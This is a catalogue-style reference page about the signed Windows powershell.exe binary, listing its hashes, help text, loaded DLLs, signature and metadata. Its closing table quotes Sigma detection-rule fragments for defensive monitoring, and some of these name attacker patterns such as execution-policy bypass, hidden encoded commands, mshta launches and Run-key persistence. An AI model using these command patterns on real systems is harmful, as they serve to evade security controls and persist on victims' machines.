---
title: powershell.exe | Windows PowerShell
excerpt: What is powershell.exe?
---

# powershell.exe 

* File Path: `C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe`
* Description: Windows PowerShell

## Hashes

Type | Hash
-- | --
MD5 | `7353F60B1739074EB17C5F4DDDEFE239`
SHA1 | `6CBCE4A295C163791B60FC23D285E6D84F28EE4C`
SHA256 | `DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C`
SHA384 | `6A8916B36014D3E2EBDAB5A948EF39808E6159F0FCE3EA4334BB7AE89BAB694AA54F235ED3AACFC63D354B0A6B51900D`
SHA512 | `BD98C8AEE1138D17C39F2FB0E09BF79EF2D6096464CEB459CC66C5FB670DF093414A373BBB4B4D8E7063C2EACB120449C45DF218033F2258F56BEC1618B43C4C`
SSDEEP | `6144:+srKopvMWwO9sV1yZywi/PzNKXzJ7BapCK5d3klRzULOnWyjLsPhAQzqO:BrKopEW2KXzJ4pdd3klnnWosPhnzq`
IMP | `741776AACCFC5B71FF59832DCDCACE0F`
PESHA1 | `D26D99E01EDFABF842342DFFA2DDE1EAC7F803B7`
PE256 | `68705285F7914823244E19E4F6DBC4A75C4DE807EA1CF128AEC2CCAFCE5FE109`

## Runtime Data

### Usage (stdout):
```cmhg

PowerShell[.exe] [-PSConsoleFile <file> | -Version <version>]
    [-NoLogo] [-NoExit] [-Sta] [-Mta] [-NoProfile] [-NonInteractive]
    [-InputFormat {Text | XML}] [-OutputFormat {Text | XML}]
    [-WindowStyle <style>] [-EncodedCommand <Base64EncodedCommand>]
    [-ConfigurationName <string>]
    [-File <filePath> <args>] [-ExecutionPolicy <ExecutionPolicy>]
    [-Command { - | <script-block> [-args <arg-array>]
                  | <string> [<CommandParameters>] } ]

PowerShell[.exe] -Help | -? | /?

-PSConsoleFile
    Loads the specified Windows PowerShell console file. To create a console
    file, use Export-Console in Windows PowerShell.

-Version
    Starts the specified version of Windows PowerShell. 
    Enter a version number with the parameter, such as "-version 2.0".

-NoLogo
    Hides the copyright banner at startup.

-NoExit
    Does not exit after running startup commands.

-Sta
    Starts the shell using a single-threaded apartment.
    Single-threaded apartment (STA) is the default.

-Mta
    Start the shell using a multithreaded apartment.

-NoProfile
    Does not load the Windows PowerShell profile.

-NonInteractive
    Does not present an interactive prompt to the user.

-InputFormat
    Describes the format of data sent to Windows PowerShell. Valid values are
    "Text" (text strings) or "XML" (serialized CLIXML format).

-OutputFormat
    Determines how output from Windows PowerShell is formatted. Valid values
    are "Text" (text strings) or "XML" (serialized CLIXML format).

-WindowStyle
    Sets the window style to Normal, Minimized, Maximized or Hidden.

-EncodedCommand
    Accepts a base-64-encoded string version of a command. Use this parameter 
    to submit commands to Windows PowerShell that require complex quotation 
    marks or curly braces.

-ConfigurationName
    Specifies a configuration endpoint in which Windows PowerShell is run.
    This can be any endpoint registered on the local machine including the
    default Windows PowerShell remoting endpoints or a custom endpoint having
    specific user role capabilities.
    
-File
    Runs the specified script in the local scope ("dot-sourced"), so that the 
    functions and variables that the script creates are available in the 
    current session. Enter the script file path and any parameters. 
    File must be the last parameter in the command, because all characters 
    typed after the File parameter name are interpreted 
    as the script file path followed by the script parameters.

-ExecutionPolicy
    Sets the default execution policy for the current session and saves it 
    in the $env:PSExecutionPolicyPreference environment variable. 
    This parameter does not change the Windows PowerShell execution policy 
    that is set in the registry.

-Command
    Executes the specified commands (and any parameters) as though they were
    typed at the Windows PowerShell command prompt, and then exits, unless 
    NoExit is specified. The value of Command can be "-", a string. or a
    script block.

    If the value of Command is "-", the command text is read from standard
    input.

    If the value of Command is a script block, the script block must be enclosed
    in braces ({}). You can specify a script block only when running PowerShell.exe
    in Windows PowerShell. The results of the script block are returned to the
    parent shell as deserialized XML objects, not live objects.

    If the value of Command is a string, Command must be the last parameter
    in the command , because any characters typed after the command are 
    interpreted as the command arguments.

    To write a string that runs a Windows PowerShell command, use the format:
	"& {<command>}"
    where the quotation marks indicate a string and the invoke operator (&)
    causes the command to be executed.

-Help, -?, /?
    Shows this message. If you are typing a PowerShell.exe command in Windows
    PowerShell, prepend the command parameters with a hyphen (-), not a forward
    slash (/). You can use either a hyphen or forward slash in Cmd.exe.

EXAMPLES
    PowerShell -PSConsoleFile SqlSnapIn.Psc1
    PowerShell -version 2.0 -NoLogo -InputFormat text -OutputFormat XML
    PowerShell -ConfigurationName AdminRoles
    PowerShell -Command {Get-EventLog -LogName security}
    PowerShell -Command "& {Get-EventLog -LogName security}"

    # To use the -EncodedCommand parameter:
    $command = 'dir "c:\program files" '
    $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
    $encodedCommand = [Convert]::ToBase64String($bytes)
    powershell.exe -encodedCommand $encodedCommand

```

### Usage (stderr):
```cmhg
At line:1 char:3
+ --help
+   ~
Missing expression after unary operator '--'.
At line:1 char:3
+ --help
+   ~~~~
Unexpected token 'help' in expression or statement.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : MissingExpressionAfterOperator
 

```

### Loaded Modules:

Path |
-- |
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2009.7-0\MpOav.dll |
C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Mf49f6405#\eef1c844e068e37a11b89ec1bfe58c6a\Microsoft.Management.Infrastructure.ni.dll |
C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.P6f792626#\c8e961023e9ebb284f5ac038896f7f8b\Microsoft.PowerShell.Security.ni.dll |
C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.Pb378ec07#\09c476bb8e1a5db27f8b3af858e06714\Microsoft.PowerShell.ConsoleHost.ni.dll |
C:\Windows\assembly\NativeImages_v4.0.30319_64\mscorlib\5543cca0df435801e2303ff46a482ed5\mscorlib.ni.dll |
C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Configuration\875dc3cfd53efc9f9a5c63016cd239d7\System.Configuration.ni.dll |
C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Core\f29b1120627489754c4b8dd317bbe950\System.Core.ni.dll |
C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Data\a39e284ddde9013349d1f350607766b8\System.Data.ni.dll |
C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Dired13b18a9#\056cc0ec5d17f063bfd68aef0dfdff2e\System.DirectoryServices.ni.dll |
C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Manaa57fc8cc#\bb0ca52db926eaec4a94a8b656f61a94\System.Management.Automation.ni.dll |
C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Management\35d31e1630335aeb7e7cb2ed836e7230\System.Management.ni.dll |
C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Numerics\65da063a028c3cfc846f5ddfffc32558\System.Numerics.ni.dll |
C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Transactions\c474b0144ec78b5ee7d68047d878855e\System.Transactions.ni.dll |
C:\Windows\assembly\NativeImages_v4.0.30319_64\System.Xml\488d073901c2c0fb8ccbcbe182b6b160\System.Xml.ni.dll |
C:\Windows\assembly\NativeImages_v4.0.30319_64\System\6885802f40fd803e49150d8a2b43a09b\System.ni.dll |
C:\Windows\Microsoft.Net\assembly\GAC_64\System.Data\v4.0_4.0.0.0__b77a5c561934e089\System.Data.dll |
C:\Windows\Microsoft.Net\assembly\GAC_64\System.Transactions\v4.0_4.0.0.0__b77a5c561934e089\System.Transactions.dll |
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clr.dll |
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\clrjit.dll |
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscoreei.dll |
C:\Windows\System32\ADVAPI32.dll |
C:\Windows\SYSTEM32\amsi.dll |
C:\Windows\System32\AppxSip.dll |
C:\Windows\SYSTEM32\ATL.DLL |
C:\Windows\System32\bcrypt.dll |
C:\Windows\System32\bcryptPrimitives.dll |
C:\Windows\System32\cfgmgr32.dll |
C:\Windows\System32\clbcatq.dll |
C:\Windows\System32\combase.dll |
C:\Windows\System32\coml2.dll |
C:\Windows\System32\CRYPT32.dll |
C:\Windows\SYSTEM32\CRYPTBASE.dll |
C:\Windows\System32\CRYPTSP.dll |
C:\Windows\System32\GDI32.dll |
C:\Windows\System32\gdi32full.dll |
C:\Windows\SYSTEM32\gpapi.dll |
C:\Windows\SYSTEM32\iertutil.dll |
C:\Windows\System32\IMM32.DLL |
C:\Windows\System32\kernel.appcore.dll |
C:\Windows\System32\KERNEL32.DLL |
C:\Windows\System32\KERNELBASE.dll |
C:\Windows\SYSTEM32\mintdh.dll |
C:\Windows\System32\MSASN1.dll |
C:\Windows\SYSTEM32\mscoree.dll |
C:\Windows\System32\MSISIP.DLL |
C:\Windows\System32\msvcp_win.dll |
C:\Windows\SYSTEM32\MSVCR120_CLR0400.dll |
C:\Windows\System32\msvcrt.dll |
C:\Windows\SYSTEM32\ntdll.dll |
C:\Windows\System32\OLE32.dll |
C:\Windows\System32\OLEAUT32.dll |
C:\Windows\SYSTEM32\OpcServices.DLL |
C:\Windows\System32\powrprof.dll |
C:\Windows\System32\profapi.dll |
C:\Windows\System32\psapi.dll |
C:\Windows\System32\RPCRT4.dll |
C:\Windows\system32\rsaenh.dll |
C:\Windows\System32\sechost.dll |
C:\Windows\SYSTEM32\secur32.dll |
C:\Windows\System32\shcore.dll |
C:\Windows\System32\shell32.dll |
C:\Windows\System32\SHLWAPI.dll |
C:\Windows\SYSTEM32\SSPICLI.DLL |
C:\Windows\SYSTEM32\tdh.dll |
C:\Windows\System32\ucrtbase.dll |
C:\Windows\SYSTEM32\urlmon.dll |
C:\Windows\System32\USER32.dll |
C:\Windows\SYSTEM32\USERENV.dll |
C:\Windows\system32\uxtheme.dll |
C:\Windows\SYSTEM32\VERSION.dll |
C:\Windows\System32\win32u.dll |
C:\Windows\System32\windows.storage.dll |
C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe |
C:\Windows\System32\WindowsPowerShell\v1.0\pwrshsip.dll |
C:\Windows\System32\wintrust.dll |
C:\Windows\SYSTEM32\wldp.dll |
C:\Windows\System32\WS2_32.dll |
C:\Windows\System32\wshext.dll |
C:\Windows\SYSTEM32\XmlLite.dll |


## Signature

* Status: Signature verified.
* Serial: `33000001C422B2F79B793DACB20000000001C4`
* Thumbprint: `AE9C1AE54763822EEC42474983D8B635116C8452`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: PowerShell.EXE.MUI
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.17763.1 (WinBuild.160101.0800)
* Product Version: 10.0.17763.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/68
* VirusTotal Link: https://www.virustotal.com/gui/file/de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c/detection/

## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe](powershell.exe-04029E121A0CFA5991749937DD22A1D9.md) | 85
[C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe](powershell.exe-097CE5761C89434367598B34FE32893B.md) | 88
[C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe](powershell.exe-C031E215B8B08C752BF362F6D4C5D3AD.md) | 74
[C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe](powershell.exe-CDA48FC75952AD12D99E526D0B6BF70A.md) | 85
[C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe](powershell.exe-F8278DB78BE164632C57002E82B07813.md) | 86
[C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe](powershell.exe-5B16D54F2AE6B74DCF863BC0F5E502B5.md) | 86
[C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe](powershell.exe-65D86C34814C02569E2AD53FD24E7F61.md) | 88
[C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe](powershell.exe-83767E18DB29B51A804A9E312D0ED99C.md) | 88
[C:\WINDOWS\SysWOW64\WindowsPowerShell\v1.0\powershell.exe](powershell.exe-BCC5A6493E0641AA1E60CBF69469E579.md) | 88
[C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe](powershell.exe-C32CA4ACFCC635EC1EA6ED8A34DF5FAC.md) | 86
[C:\windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe](powershell.exe-EF8FA4F195C6239273C100AB370FCFDC.md) | 74

## Possible Misuse

*The following table contains possible examples of `powershell.exe` being misused. While `powershell.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [godmode_sigma_rule.yml](https://github.com/Neo23x0/sigma/blob/master/other/godmode_sigma_rule.yml) | `- '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_creation_system_file.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/file_event/sysmon_creation_system_file.yml) | `- '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_susp_adsi_cache_usage.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/file_event/sysmon_susp_adsi_cache_usage.yml) | `- 'C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_in_memory_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_in_memory_powershell.yml) | `description: Detects loading of essential DLL used by PowerShell, but not by the process powershell.exe. Detects meterpreter's "load powershell" extension.` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_in_memory_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_in_memory_powershell.yml) | `- '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_suspicious_dbghelp_dbgcore_load.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/image_load/sysmon_suspicious_dbghelp_dbgcore_load.yml) | `- '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_powershell_network_connection.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/network_connection/sysmon_powershell_network_connection.yml) | `Image: '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_alternate_powershell_hosts.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_alternate_powershell_hosts.yml) | `description: Detects alternate PowerShell hosts potentially bypassing detections looking for powershell.exe` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_alternate_powershell_hosts.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_alternate_powershell_hosts.yml) | `- ContextInfo: 'powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_alternate_powershell_hosts.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_alternate_powershell_hosts.yml) | `- Message: 'powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_suspicious_invocation_specific.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_suspicious_invocation_specific.yml) | `- '*powershell.exe reg add HKCU\software\microsoft\windows\currentversion\run*'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_apt_muddywater_dnstunnel.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/sysmon_apt_muddywater_dnstunnel.yml) | `- '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_apt_babyshark.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_babyshark.yml) | `- powershell.exe mshta.exe http*` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_apt_wocao.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_apt_wocao.yml) | `- 'cmd /c powershell.exe -ep bypass -file c:\s.ps1'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_dnscat2_powershell_implementation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_dnscat2_powershell_implementation.yml) | `ParentImage\|endswith: '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_exploit_cve_2020_10189.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_exploit_cve_2020_10189.yml) | `- '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_html_help_spawn.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_html_help_spawn.yml) | `- '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mmc_spawn_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mmc_spawn_shell.yml) | `- '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_mshta_spawn_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_mshta_spawn_shell.yml) | `- '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_multiple_suspicious_cli.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_multiple_suspicious_cli.yml) | `- powershell.exe` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_new_service_creation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_new_service_creation.yml) | `- Image\|endswith: '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_non_interactive_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_non_interactive_powershell.yml) | `description: Detects non-interactive PowerShell activity by looking at powershell.exe with not explorer.exe as a parent.` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_non_interactive_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_non_interactive_powershell.yml) | `Image\|endswith: '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_office_shell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_office_shell.yml) | `- '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_powershell_bitsjob.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_powershell_bitsjob.yml) | `Image\|endswith: '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_powershell_downgrade_attack.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_powershell_downgrade_attack.yml) | `Image\|endswith: '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_powershell_download.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_powershell_download.yml) | `Image: '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_powershell_suspicious_parameter_variation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_powershell_suspicious_parameter_variation.yml) | `- '\Powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_powersploit_empire_schtasks.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_powersploit_empire_schtasks.yml) | `- '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_remote_time_discovery.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_remote_time_discovery.yml) | `- Image\|endswith: '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml) | `- 'powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary.yml) | `- '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary_highly_relevant.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml) | `- "powershell.exe"` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_binary_highly_relevant.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_binary_highly_relevant.yml) | `- '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_renamed_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_renamed_powershell.yml) | `- '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_run_powershell_script_from_ads.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_run_powershell_script_from_ads.yml) | `ParentImage\|endswith: '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_run_powershell_script_from_ads.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_run_powershell_script_from_ads.yml) | `Image\|endswith: '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_shadow_copies_creation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_creation.yml) | `- '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_shadow_copies_deletion.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_deletion.yml) | `- '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_shell_spawn_susp_program.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shell_spawn_susp_program.yml) | `- '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_crackmapexec_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_crackmapexec_execution.yml) | `- '*powershell.exe -exec bypass -noni -nop -w 1 -C "*'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_crackmapexec_execution.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_crackmapexec_execution.yml) | `- '*powershell.exe -noni -nop -w 1 -enc *'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_crackmapexec_powershell_obfuscation.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_crackmapexec_powershell_obfuscation.yml) | `CommandLine\|contains: 'powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_eventlog_clear.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_eventlog_clear.yml) | `Image\|endswith: '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_powershell_hidden_b64_cmd.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_powershell_hidden_b64_cmd.yml) | `Image: '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_powershell_parent_combo.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_powershell_parent_combo.yml) | `- '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_powershell_parent_process.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_powershell_parent_process.yml) | `description: Detects a suspicious parents of powershell.exe` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_regsvr32_anomalies.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_regsvr32_anomalies.yml) | `ParentImage: '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_shell_spawn_from_mssql.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_shell_spawn_from_mssql.yml) | `- '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_use_of_csharp_console.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_use_of_csharp_console.yml) | `ParentImage\|endswith: '\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_system_exe_anomaly.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_system_exe_anomaly.yml) | `- '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_webshell_spawn.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_webshell_spawn.yml) | `- '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_wmi_spwns_powershell.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_wmi_spwns_powershell.yml) | `- '*\powershell.exe'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
